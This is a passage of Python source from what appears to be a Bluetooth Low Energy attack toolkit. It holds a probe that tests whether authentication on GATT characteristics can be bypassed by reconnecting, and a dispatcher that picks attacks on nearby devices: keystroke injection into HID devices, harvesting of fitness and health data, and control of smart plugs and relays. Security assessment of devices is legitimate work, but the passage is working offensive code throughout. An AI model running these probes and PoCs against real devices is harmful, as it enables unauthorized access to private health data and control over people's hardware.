    targets: list[tuple[GATTCharacteristic, str]] = []
    for char in dev.all_characteristics():
        if "read" in char.properties and not char.readable_without_auth:
            targets.append((char, "read"))
        write_props = {"write", "write-without-response"}
        if write_props & set(char.properties) and not char.writable_without_auth:
            targets.append((char, "write"))

    if not targets:
        _log("[RECONNECT] No auth-gated characteristics found — device is fully open or has no r/w chars")
        return []

    n_reads  = sum(1 for _, op in targets if op == "read")
    n_writes = sum(1 for _, op in targets if op == "write")
    _log(f"[RECONNECT] Auth-bypass probe: {dev.mac} ({dev.name})")
    _log(f"[RECONNECT] Auth-gated targets: {len(targets)}  ({n_reads} reads, {n_writes} writes)")
    _log(f"[RECONNECT] Random/private MAC: {'yes — iOS/Android RPA; device may not reconnect' if is_random_mac(dev.mac) else 'no'}")

    # ── Phase 1: baseline ────────────────────────────────────────────────────
    _log("[RECONNECT] ── Phase 1: Baseline (confirm which chars are blocked) ──")
    p1 = await _probe_phase(dev, targets, "P1", timeout, _log)
    if not p1:
        return []

    confirmed_blocked = [
        (char, op) for char, op in targets
        if p1.get((char.uuid, op), ("error",))[0] == "blocked"
    ]
    unexpected_open = [
        (char, op) for char, op in targets
        if p1.get((char.uuid, op), ("error",))[0] == "allowed"
    ]

    if unexpected_open:
        _log(f"[RECONNECT] ⚠  {len(unexpected_open)} char(s) were blocked in GATT enum but ALLOWED now — "
             f"device auth inconsistency")

    if not confirmed_blocked:
        _log("[RECONNECT] No chars confirmed blocked in phase 1 — nothing to test in reconnect phases")
        findings = []
        for char, op in unexpected_open:
            val = p1[(char.uuid, op)][1]
            findings.append(ReconnectBypass(
                char_uuid=char.uuid, description=char.description or "",
                operation=op, phase1="allowed", phase2="skipped", phase3="skipped",
                bypass=False, read_value=val,
                severity="HIGH",
                detail="Accessible now but was blocked during GATT enum — inconsistent auth enforcement",
            ))
        return findings

    _log(f"[RECONNECT] {len(confirmed_blocked)} confirmed-blocked target(s) to test on reconnect")

    # ── Phase 2: immediate reconnect ────────────────────────────────────────
    _log("[RECONNECT] ── Phase 2: Immediate reconnect (0.5 s gap) ──")
    await asyncio.sleep(0.5)
    p2 = await _probe_phase(dev, confirmed_blocked, "P2", timeout, _log)

    # ── Phase 3: delayed reconnect ──────────────────────────────────────────
    _log("[RECONNECT] ── Phase 3: Delayed reconnect (3 s gap) ──")
    await asyncio.sleep(3.0)
    p3 = await _probe_phase(dev, confirmed_blocked, "P3", timeout, _log)

    # ── Build findings ───────────────────────────────────────────────────────
    findings: list[ReconnectBypass] = []

    for char, op in confirmed_blocked:
        p1_out = p1.get((char.uuid, op), ("error", None))
        p2_out, p2_val = p2.get((char.uuid, op), ("skipped", None))
        p3_out, p3_val = p3.get((char.uuid, op), ("skipped", None))

        bypass = p2_out == "allowed" or p3_out == "allowed"

        if p2_out == "allowed":
            sev    = "CRITICAL" if op == "write" else "HIGH"
            detail = (f"AUTH BYPASS — {op} was blocked in phase 1, "
                      f"allowed immediately after reconnect (no re-auth)")
            read_value = p2_val
        elif p3_out == "allowed":
            sev    = "HIGH"
            detail = (f"AUTH BYPASS (3 s window) — {op} was blocked in phase 1, "
                      f"allowed after 3 s reconnect (timing-window bypass)")
            read_value = p3_val
        else:
            sev    = "INFO"
            detail = f"No bypass — {op} correctly blocked across all reconnect phases"
            read_value = None

        findings.append(ReconnectBypass(
            char_uuid=char.uuid, description=char.description or "",
            operation=op, phase1=p1_out[0], phase2=p2_out, phase3=p3_out,
            bypass=bypass, read_value=read_value,
            severity=sev, detail=detail,
        ))

    # Update device flags if bypass found
    bypasses = [f for f in findings if f.bypass]
    if bypasses and "AUTH_BYPASS" not in dev.sec_flags:
        dev.sec_flags.append("AUTH_BYPASS")

    # Also classify unexpected_open as HIGH findings
    for char, op in unexpected_open:
        val = p1.get((char.uuid, op), (None, None))[1]
        findings.append(ReconnectBypass(
            char_uuid=char.uuid, description=char.description or "",
            operation=op, phase1="allowed", phase2="skipped", phase3="skipped",
            bypass=False, read_value=val,
            severity="HIGH",
            detail="Accessible now but was blocked during GATT enum — inconsistent auth enforcement",
        ))

    # ── Summary ──────────────────────────────────────────────────────────────
    _log(f"[RECONNECT] ─────────────────────────────────────────────")
    _log(f"[RECONNECT] {len(findings)} finding(s) — {len(bypasses)} auth bypass(es)")
    for f in [x for x in findings if x.bypass or x.severity in ("CRITICAL", "HIGH")]:
        val_note = f"  value={f.read_value.hex()[:32]}" if f.read_value else ""
        _log(f"[RECONNECT]   [{f.severity}] {f.char_uuid}  ({f.operation}): {f.detail}{val_note}")

    return findings


# ── Auto-dispatcher ───────────────────────────────────────────────────────────

async def run_best_poc(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Select and run the best PoC based on device capabilities and flags.

    Priority:
      1. HID device with open write       → HID injection
      2. Audio / Headset                  → Audio PoC
      3. Fitness Tracker                  → Fitness PoC
      4. Health Monitor / sensor caps     → Sensor PoC
      5. Smart plug / relay caps          → Smart plug PoC
      6. High notifiable count (≥5)       → Generic dump (data harvest)
      7. Fallback                         → Generic dump + write probe
    """
    caps_lower = " ".join(dev.capabilities).lower()
    flags = dev.sec_flags

    if "hid device" in caps_lower and "OPEN_WRITE" in flags:
        return await poc_hid_injection(dev, text="air-bt poc", timeout=timeout, log_cb=log_cb)

    if "audio" in caps_lower or "headset" in caps_lower:
        return await poc_audio_device(dev, timeout=timeout, log_cb=log_cb)

    if "fitness" in caps_lower:
        return await poc_fitness_tracker(dev, timeout=timeout, log_cb=log_cb)

    if any(k in caps_lower for k in ("health", "sensor", "environment", "thermometer", "glucose", "blood")):
        return await poc_iot_sensor(dev, timeout=timeout, log_cb=log_cb)

    if any(k in caps_lower for k in ("gpio", "io control", "relay", "uart")):
        return await poc_smart_plug(dev, timeout=timeout, log_cb=log_cb)

    if dev.notifiable >= 5:
        return await poc_generic_dump(dev, timeout=timeout, log_cb=log_cb)

    results = await poc_generic_dump(dev, timeout=timeout, log_cb=log_cb)
    if "OPEN_WRITE" in flags:
        results += await poc_write_probe(dev, timeout=timeout, log_cb=log_cb)
    return results
